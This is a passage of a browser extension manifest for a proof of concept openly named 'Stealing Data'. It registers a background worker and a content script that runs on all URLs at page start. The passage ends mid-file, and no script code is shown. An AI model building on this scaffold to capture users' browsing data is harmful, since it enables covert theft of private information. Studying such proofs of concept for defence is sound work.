{
    "name": "Stealing Data",
    "description": "Steals all kind of data, POC",
    "version": "0.1.0",
    "manifest_version": 3,
    "background": {
        "service_worker": "background.js"
    }, 
    "content_scripts": [
        {
          "matches": ["<all_urls>"],
          "css": [],
          "js": ["content_script.js"],
          "run_at": "document_start"
